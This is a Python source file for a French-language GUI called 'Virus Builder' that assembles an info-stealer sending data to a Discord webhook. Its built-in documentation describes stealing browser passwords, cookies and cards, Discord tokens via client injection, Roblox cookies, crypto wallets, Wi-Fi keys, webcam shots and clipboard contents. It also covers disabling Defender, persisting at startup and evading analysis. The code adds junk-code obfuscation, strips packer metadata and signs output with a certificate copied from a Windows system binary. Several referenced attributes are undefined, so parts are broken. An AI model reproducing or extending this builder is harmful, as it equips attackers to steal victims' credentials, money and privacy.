import base64
import copy
import customtkinter as ctk
import logging
import logging.handlers
import os
import pyaes
import py_compile
import random
import re
import requests
import shutil
import string
import subprocess
import sys
import threading
import time
import winreg
import zipfile
import zlib
from PIL import Image
from tkinter import filedialog, messagebox
from tools import upx
from tools.sigthief import signfile, outputCert
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title(f"Virus Builder")
        self.geometry("1080x550")
        self.resizable(False, False)
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        ctk.set_appearance_mode("dark")

        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "fakeerror": False,
            "startup": False,
            "bound_startup": False,
            "defender": False,
            "systeminfo": False,
            "common_files": False,
            "browser": False,
            "roblox": False,
            "injection": False,
            "wifi": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False,
            "clipboard": False,
            "webcam": False,
            "games": False,
            "screenshot": False,
            "mutex": None
        }

        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        self.logo_image = ctk.CTkImage(Image.open(os.path.join(image_path, "Virus.png")), size=(60, 60))
        self.large_test_image = ctk.CTkImage(Image.open(os.path.join(image_path, "Virus.png")), size=(500, 150))
        self.image_icon_image = ctk.CTkImage(Image.open(os.path.join(image_path, "Virus.png")), size=(20, 20))
        self.dashboard_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
        self.docs_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
        self.help_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}Virus.ico")
        self.boundExePath = ""
        self.boundExeRunOnStartup = False

        self.navigation_frame = ctk.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = ctk.CTkLabel(self.navigation_frame, text="  Virus Builder", image=self.logo_image,
                                                             compound="left", font=ctk.CTkFont(size=15, weight="bold", family=self.font))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.dashboard_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Construction",
                                                        font=ctk.CTkFont(family=self.font, size=13), fg_color="transparent",
                                                        text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                        image=self.dashboard_image, anchor="w", command=self.home_button_event)
        self.dashboard_button.grid(row=1, column=0, sticky="ew")

        self.frame_2_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=ctk.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew")

        self.builder_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.builder_frame.grid_columnconfigure(0, weight=1)

        # Frame 1

        self.webhook_button = ctk.CTkEntry(self.builder_frame, width=570, height=35, font=ctk.CTkFont(
            size=15, family=self.font), placeholder_text="https://discord(app).com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = ctk.CTkButton(master=self.builder_frame, width=100, height=35, text="Vérifier Webhook",
                                                           command=self.check_webhook_button,
                                                           fg_color="#0100ff", hover_color="#2c81ff", font=ctk.CTkFont(size=15, family=self.font))
        self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)

        self.all_options = ctk.CTkLabel(self.builder_frame, text="Options de Build", font=ctk.CTkFont(size=35, weight="bold", family=self.font))
        self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)

        self.option_help = ctk.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#0100ff", hover_color="#2c81ff")
        self.option_help.grid(row=1, column=0, sticky="ne", padx=35, pady=15)

        self.ping = ctk.CTkCheckBox(self.builder_frame, text="Ping", font=ctk.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#0100ff", hover_color="#2c81ff")
        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=150)

        self.pingtype = ctk.CTkOptionMenu(
            self.builder_frame, width=20, values=["Everyone", "Here"],
            font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", button_hover_color="#2c81ff", button_color="#0600d0")
        self.pingtype.set(value="Here")
        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=148)
        self.pingtype.configure(state="disabled")

        self.error = ctk.CTkCheckBox(self.builder_frame, text="Fausse Erreur", font=ctk.CTkFont(
            size=17, family=self.font), fg_color="#0100ff", hover_color="#2c81ff")
        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=105)

        self.startup = ctk.CTkCheckBox(
            self.builder_frame, text="Ajouter au démarrage", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=60)

        self.defender = ctk.CTkCheckBox(
            self.builder_frame, text="Désactiver Defender", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=60)

        self.games = ctk.CTkCheckBox(
            self.builder_frame, text="Jeux", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.games.grid(row=1, column=0, sticky="nw", padx=286, pady=105)

        self.antidebug_vm = ctk.CTkCheckBox(
            self.builder_frame, text="VM anti-débogage", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=150)

        self.screenshot = ctk.CTkCheckBox(
            self.builder_frame, text="Capture d'écran", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.screenshot.grid(row=1, column=0, sticky="ne", padx=131, pady=150)

        self.discord = ctk.CTkCheckBox(
            self.builder_frame, text="Infos Discord", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.discord.grid(row=1, column=0, sticky="ne", padx=150, pady=60)

        self.wifi = ctk.CTkCheckBox(self.builder_frame, text="Infos Wifi", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#0100ff", hover_color="#2c81ff")
        self.wifi.grid(row=1, column=0, sticky="ne", padx=178, pady=105)

        self.systeminfo = ctk.CTkCheckBox(
            self.builder_frame, text="Infos Système", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=195)

        self.common_files = ctk.CTkCheckBox(
            self.builder_frame, text="Fichiers Common", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.common_files.grid(row=1, column=0, sticky="nw", padx=286, pady=195)

        self.browser = ctk.CTkCheckBox(
            self.builder_frame, text="Infos Navigateur", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.browser.grid(row=1, column=0, sticky="ne", padx=127, pady=195)

        self.roblox = ctk.CTkCheckBox(self.builder_frame, text="Infos Roblox", font=ctk.CTkFont(size=17, family=self.font),
                                                fg_color="#0100ff", hover_color="#2c81ff")
        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=240)

        self.wallets = ctk.CTkCheckBox(self.builder_frame, text="Portefeuilles", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#0100ff", hover_color="#2c81ff", command=lambda: (self.check_pumper(), self.check_pump()))
        self.wallets.grid(row=1, column=0, sticky="nw", padx=286, pady=240)

        self.injection = ctk.CTkCheckBox(
            self.builder_frame, text="Injection", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#0100ff", hover_color="#2c81ff")
        self.injection.grid(row=1, column=0, sticky="ne", padx=180, pady=240)

        self.antispam = ctk.CTkCheckBox(self.builder_frame, text="Anti-Spam", font=ctk.CTkFont(size=17, family=self.font),
                                                  fg_color="#0100ff", hover_color="#2c81ff")
        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=285)

        self.self_destruct = ctk.CTkCheckBox(self.builder_frame, text="Auto-Destruction", font=ctk.CTkFont(size=17, family=self.font),
                                                       fg_color="#0100ff", hover_color="#2c81ff")
        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=285)

        self.clipboard = ctk.CTkCheckBox(self.builder_frame, text="Presse-Papier", font=ctk.CTkFont(size=17, family=self.font),
                                                fg_color="#0100ff", hover_color="#2c81ff")
        self.clipboard.grid(row=1, column=0, sticky="nw", padx=85, pady=328)
        
        self.webcam = ctk.CTkCheckBox(self.builder_frame, text="Webcam", font=ctk.CTkFont(size=17, family=self.font),
                                                fg_color="#0100ff", hover_color="#2c81ff")
        self.webcam.grid(row=1, column=0, sticky="nw", padx=286, pady=328)

        self.filename = ctk.CTkEntry(self.builder_frame, width=250, font=ctk.CTkFont(size=33, family=self.font),
                                               placeholder_text="Nom du Fichier")
        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=415)

        self.build = ctk.CTkButton(self.builder_frame, width=250, text="Build", font=ctk.CTkFont(size=35, family=self.font),
                                             fg_color="#0100ff", hover_color="#2c81ff", command=self.buildfile)
        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=415)
        
        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.common_files, self.browser, self.webcam,
                           self.roblox, self.injection, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
                           self.antispam, self.self_destruct, self.wallets, self.screenshot]

        self.second_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame.grid_columnconfigure(0, weight=1)

        self.docs = ctk.CTkLabel(self.second_frame, text="Documentation", font=ctk.CTkFont(size=35, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)

        self.docsbox = ctk.CTkTextbox(self.second_frame, width=725, height=485, font=ctk.CTkFont(size=12, weight="bold", family=self.font))
        self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
        self.docsbox.insert(
            "0.0",
            """
Ajouter au démarrage:\nCela ajoutera le fichier au dossier de démarrage de l'utilisateur. Ainsi, lorsqu'il allumera son ordinateur, le fichier \ns'exécutera et ses informations seront à nouveau \nenvoyées à votre webhook.\n\n
Désactiver le Defender:\nCela tentera de désactiver Defender et d’ajouter des exclusions pour .py, .exe, appdata et localappdata.\n\n
Fausse erreur:\nCela créera une fausse erreur lorsque le fichier sera exécuté pour semer la confusion chez la victime.\n\n
Ping:\nCela vous enverra une requête ping au moment où les informations seront envoyées à votre webhook.\n\n
Type de ping:\nIl existe deux options : @everyone et @here. @everyone envoie un ping à tous ceux qui peuvent accéder à cette chaîne et @here envoie un ping aux personnes actives sur cette chaîne.\n\n
Information système:\nCela obtiendra les informations sur le PC de l'utilisateur telles que le nom du PC, le système d'exploitation, l'adresse IP, \nl'adresse Mac, le matériel, le processeur, le GPU et la RAM.\n\n
Fichiers communs:\nRecherche le bureau, les documents, le dossier Téléchargements pour les fichiers contenant des informations sensibles \n(comme « secret », « mot de passe », etc.) ou des extensions de fichiers spécifiques (.txt, .pdf, etc.), à l'exclusion des \nraccourcis.\n\n
Infos sur le navigateur:\nCela permettra d'obtenir le navigateur de l'utilisateur, comme les mots de passe du navigateur, l'historique, les cookies et \nles cartes de crédit. (Force la fermeture des navigateurs)\n\n
Infos Roblox:\nCela obtiendra les informations Roblox de l'utilisateur, telles que son nom d'utilisateur, son cookie Roblox et la quantité de Robux dont il dispose.\n\n
Injection:\nCela injectera un script dans la discorde de votre victime, ce qui signifie que lorsqu'elle modifiera ses informations \nd'identification, vous recevrez son mot de passe et jeton Discord.\n\n
Infos Wi-Fi:\nCela obtiendra les informations Wi-Fi de l'utilisateur telles que les mots de passe Wi-Fi et les réseaux Wi-Fi.\n\n
Jeux:\nCela volera actuellement les logins Epic et Minecraft.\n\n
VM anti-débogage:\nCela vérifiera si l'utilisateur utilise une machine virtuelle ou s'il débogue ce script et il quittera pour l'arrêter.\n\n
Infos Discord:\nCela vous enverra toutes les informations Discord pour chaque compte dont ils disposent. Ces informations comprennent \nleur e-mail, leur numéro de téléphone, si ils ont activé 2fa, s'ils ont du nitro et quel type de nitro, de jeton et de \ncartes-cadeaux.\n\n
Anti-spam:\nPermet uniquement à la victime d'ouvrir le fichier toutes les 60 secondes afin que votre webhook ne soit pas limité en débit ou spammé.\n\n
Auto-destruction:\nSupprime le fichier une fois exécuté afin que la victime ne puisse plus l'exécuter.\n\n
Presse-papiers:\nRécupère la dernière chose qu'ils ont copiée dans leur presse-papiers.\n\n
Webcam:\nPrend une photo avec chaque webcam connectée.\n\n
Portefeuilles:\nVole les portefeuilles crypto de l'utilisateur.\n\n
Options de construction:\n
Pyinstaller - Construit un fichier exécutable autonome contenant les modules nécessaires.\nAvantages : Fichier unique, temps de compilation rapide, facile à transférer.\nInconvénients : Détecté par les antivirus, taille de fichier importante\n""")

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        self.dashboard_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=("gray75", "gray25") if name == "frame_2" else "transparent")

        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.builder_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def verify_webhook(self):
        webhook = self.webhook_button.get()
        webhook_pattern = r'https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/\S+'
        try:
            if re.match(webhook_pattern, webhook):
                r = requests.get(webhook, timeout=5)
                if r.status_code == 200:
                    return True
                else:
                    logging.error(f"Webhook non valide. Status code: {r.status_code}. Webhook: {webhook}")
                    return False
            else:
                logging.error(f"Format de webhook invalide: {webhook}")
                return False
        except Exception as e:
            logging.error(f"Impossible de vérifier le webhook: {e}")
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(width=100, height=35, fg_color="green", hover_color="#0db60e",
                                               text="Webhook valide", font=ctk.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            self.updated_dictionary["webhook"] = self.webhook_button.get()
        else:
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                               text="Webhook invalide", font=ctk.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def file_type_check(self, _):
            self.get() == ".py"
            self.startup.configure(state="disabled")
            self.startup.deselect()
            self.pump.configure(state="disabled")
            self.pump.deselect()
            self.boundExePath = ""
            
    def update_config(self):
        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "fakeerror": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "systeminfo": self.systeminfo,
            "common_files": self.common_files,
            "browser": self.browser,
            "roblox": self.roblox,
            "injection": self.injection,
            "wifi": self.wifi,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct,
            "clipboard": self.clipboard,
            "webcam": self.webcam,
            "wallets": self.wallets,
            "games": self.games,
            "screenshot": self.screenshot
        }

        for key, checkbox in checkbox_mapping.items():
            self.updated_dictionary["mutex"] = "".join(random.choices(string.ascii_letters + string.digits, k=16))
            self.updated_dictionary["bound_startup"] = self.boundExeRunOnStartup
            try:
                if checkbox.get():
                    if key == "webhook":
                        self.updated_dictionary[key] = self.webhook_button.get()
                    else:
                        self.updated_dictionary[key] = True
                elif checkbox.get() == 0:
                    self.updated_dictionary[key] = False
                ping_message = self.pingtype.get()
                if ping_message in ["Here", "Everyone"]:
                    self.updated_dictionary["pingtype"] = ping_message
                elif self.ping.get() == 0:
                    self.updated_dictionary["pingtype"] = "None"
            except Exception as e:
                logging.error(f"Error with updating config: {e}")

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#0100ff", hover_color="#2c81ff", text="Vérifier le webhook")

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(text=f"Building{i}")
                time.sleep(0.3)
                self.update()

    def return_filename(self):
        try:
            get_file_name = self.filename.get().replace(" ", "-")
            if not get_file_name:
                random_name = ''.join(random.choices(string.ascii_letters, k=5))
                logging.info(f"Retrieved filename: test-{random_name}")
                return f"test-{random_name}"
            else:
                logging.info(f"Retrieved filename: {get_file_name}")
                return get_file_name
        except Exception as e:
            logging.error(f"Error with getting filename: {e}")

    def get_config(self):
            options = self.basefilepath + "\\options\\"
            try:
                with open(self.basefilepath + "\\Build.py", 'r', encoding="utf-8") as f:
                    code = f.read()

                copy_dict = copy.deepcopy(self.updated_dictionary)
                config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
                code = f"{config_str}\n\n{code}"

                option_mapping = {
                "anti_spam": "AntiSpam.py",
                "common_files": "CommonFiles.py",
                "browser": "Browsers.py",
                "roblox": "Roblox.py",
                "clipboard": "Clipboard.py",
                "antidebug_vm": "Debug.py",
                "defender": "Defender.py",
                "discord": "Discord.py",
                "fakeerror": "Fake_error.py",
                "injection": "Injection.py",
                "systeminfo": "System.py",
                "self_destruct": "SelfDestruct.py",
                "startup": "Startup.py",
                "wifi": "Wifi.py",
                "webcam": "Webcam.py",
                "wallets": "Wallets.py",
                "games": "Games.py",
                "screenshot": "Screenshot.py"
                }
                
                for key, filename in option_mapping.items():
                    if self.updated_dictionary.get(key):
                        with open(f"{options}{filename}", "r", encoding="utf-8") as f:
                            code += f.read()
                            code += "\n\n"

                code += """Virus(__CONFIG__["webhook"])"""

                lines = code.split('\n')
                unique_lines = []
                imported_modules = set()
                
                for line in lines:
                    if line.startswith("import ") or line.startswith("from "):
                        module_name = line.split()[1]
                        if module_name not in imported_modules:
                            unique_lines.append(line)
                            imported_modules.add(module_name)
                    else:
                        unique_lines.append(line)	
                cleaned_code = '\n'.join(unique_lines)

                logging.info("Successfully changed config")
                return cleaned_code
            except Exception as e:
                logging.error(f"Error with config: {e}")

    def file_pumper(self, filename, extension, size):
        try:
            pump_size = size * 1024 ** 2
            with open(f"./{filename}.{extension}", 'ab') as f:
                for _ in range(int(pump_size)):
                    f.write((b'\x00'))
            logging.info(f"Successfully pumped file: {filename}.{extension}")
        except Exception as e:
            logging.error(f"Error with file pumper: {e}")

    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.exe.spec', "./tools/upx.exe", "bound.Virus", "Virus.aes", "loader-o.py", "loader-o.spec"}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    logging.info(f"Successfully removed directory: {clean}")
            except Exception as e:
                logging.error(f"Couldn't remove directory: {clean}. {e}")
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    logging.info(f"Successfully removed file: {clean}")
            except Exception as e:
                logging.error(f"Couldn't remove file: {clean}. {e}")
                pass
                continue

    def write_and_obfuscate(self, filename):
        def _generate_name():
            return '_%s' % ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 20)))
        
        def _junk(path: str) -> None:
            with open(path) as file:
                code = file.read()
            junk_funcs = [_generate_name() for _ in range(random.randint(25, 40))]
            junk_func_calls = junk_funcs.copy()
            
            junk_code = """
class %s:
    def __init__(self):
            """.strip() % _generate_name()
        
            junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %_generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])
        
            random.shuffle(junk_funcs)
            random.shuffle(junk_func_calls)
        
            junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([_generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])
        
            with open(path, "w") as file:
                file.write(code + "\n" + junk_code)
        
        try:
            # Update the path to save the file in the 1-Output/VirusBuilder/ directory
            output_directory = os.path.join(self.basefilepath, "1-Output", "VirusBuilder")
            if not os.path.exists(output_directory):
                os.makedirs(output_directory)

            output_file_path = os.path.join(output_directory, f"{filename}.py")

            with open(output_file_path, 'w', encoding="utf-8") as f:
                f.write(self.get_config())

            if self.obfuscation.get() == 1:
                _junk(output_file_path)
                os.system(f"\"{sys.executable}\" ./tools/obfuscation.py -i {output_file_path}")
                os.remove(output_file_path)
                os.rename(f"./Obfuscated_{filename}.py", output_file_path)
                logging.info(f"Successfully obfuscated file: {output_file_path}")
        except Exception as e:
            _message = f"Error with writing and obfuscating file: {e}"
            print(_message)
            logging.error(_message)

    def buildfile(self):
        if self.return_filename() == "nuitka":
            _message = "Nom de fichier invalide."
            logging.error(_message)
            print(_message)
            return
        if not self.verify_webhook():
            _message = "Webhook non valide. Abandon de la compilation."
            logging.error(_message)
            print(_message)
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                               text="Webhook invalide", font=ctk.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            return
    
        self.switchStateOfAll("disabled")
        filename = self.return_filename()
        self.update_config()
        self.write_and_obfuscate(filename)    
        
        try:
            if self.get_filetype() == "py":  # Correction: condition dans le bloc `try`
                pass

        except Exception as e:
            logging.error(f"Erreur lors de la construction du fichier : {e}")
        finally:
            self.cleanup_files(filename)
            self.switchStateOfAll("normal")
            self.build.configure(text="Build")
            self.quit()

            
    def PostProcessing(self, filename: str) -> None:
        logging.info("Removing MetaData")
        print("Removing MetaData")
        with open(filename, "rb") as file:
            data = file.read()
        
        data = data.replace(b"PyInstaller:", b"PyInstallem:")
        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
        
        data = data.replace(b"NUITKA_ONEFILE_PARENT", b"NUKTEM_ONEFILE_PARENT")
        data = data.replace(b"NUITKA_ONEFILE_BINARY", b"NUKTEM_ONEFILE_BINARY")
        
        with open(filename, "wb") as file:
            file.write(data)
        
        logging.info("Renaming Entry Point")
        print("Renaming Entry Point")
        with open(filename, "rb") as file:
            data = file.read()
    
        entryPoint = "Virus"
        entryPoint = entryPoint.encode()
        new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
        data = data.replace(entryPoint, new_entryPoint)
    
        with open(filename, "wb") as file:
            file.write(data)

        logging.info("Adding Certificate")
        print("Adding Certificate")
        certFile = "cert"
        if os.path.isfile(certFile):
            signfile(filename, certFile, filename)
                
    def switchStateOfAll(self, state: str) -> None:
        for checkbox in self.checkboxes:
            checkbox.configure(state=state)
        self.filename.configure(state=state)
        self.build.configure(state=state)
        self.checkwebhook_button.configure(state=state)
        self.webhook_button.configure(state=state)
        
    def MakeVersionFileAndCert(self) -> None:
        original: str
        retries = 0
        exeFiles = []
        paths = [
            os.getenv("SystemRoot"),
            os.path.join(os.getenv("SystemRoot"), "System32"),
            os.path.join(os.getenv("SystemRoot"), "sysWOW64")
        ]
    
        with open("version.txt") as exefile:
            original = exefile.read()
    
        for path in paths:
            if os.path.isdir(path):
                exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and x not in exeFiles)]
                
        if exeFiles:
            while(retries < 5):
                exefile = random.choice(exeFiles)
                res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
                if res.returncode != 0:
                    retries += 1
                else:
                    with open("version.txt") as file:
                        content = file.read()
                    if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
                        retries += 1
                        continue
                    else:
                        outputCert(exefile, "cert")
                        break
    
            if retries >= 5:
                with open("version.txt", "w") as exefile:
                    exefile.write(original)
                    
    def PrepareBound(self):
        if os.path.isfile(self.boundExePath):
            with open(self.boundExePath, "rb") as f:
                content = f.read()
                
            encrypted = zlib.compress(content)[::-1]
            
            with open("bound.Virus", "wb") as f:
                f.write(encrypted)
                
        elif os.path.isfile("bound.Virus"):
            os.remove("bound.Virus")

if __name__ == "__main__":
    App().mainloop()
